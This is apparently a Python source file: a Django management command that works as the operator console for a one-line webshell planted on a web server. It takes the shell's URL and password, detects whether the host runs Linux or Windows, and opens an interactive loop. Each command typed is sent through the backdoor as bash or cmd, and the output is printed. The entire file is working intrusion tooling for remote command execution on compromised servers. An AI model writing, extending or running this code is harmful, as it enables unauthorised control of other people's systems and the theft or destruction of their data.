from django.core.management.base import BaseCommand, CommandError
from nife.core.SendCode import SendCode

class Command(BaseCommand):

    def add_arguments(self, parser):
        parser.add_argument(
            '-url',
            dest='url',
            default='close',
            help='一句话木马的url',
        )
        parser.add_argument(
            '-pwd',
            dest='pwd',
            default='close',
            help='一句话木马的密码',
        )

    def handle(self, *args, **options):
        if options['url'] == 'close' or options['pwd'] == 'close':
            self.stdout.write(self.style.ERROR('参数错误，-h 查看帮助'))
        else:
            try:
                s = SendCode(url=options['url'], pwd=options['pwd'])
                sitdir, pos = s.execCreate()
                if pos ==1:
                    raw_cmd = 'cd {0};{1};echo [S];pwd;echo [E]'
                    bash = '/bin/bash'
                else:
                    raw_cmd = 'cd {0}&{1}&echo [S]&cd&echo [E]'
                    bash = 'cmd'
                while True:
                    cmd = input(sitdir+":")
                    if cmd == 'exit':
                        self.stdout.write(self.style.SUCCESS("Bye!!!"))
                        break
                    res, newdir = s.execShell(cmd=bash, options=raw_cmd.format(sitdir, cmd))
                    print(res)
                    sitdir = newdir

            except Exception as e:
                self.stdout.write(self.style.ERROR('错误，-h 查看帮助'))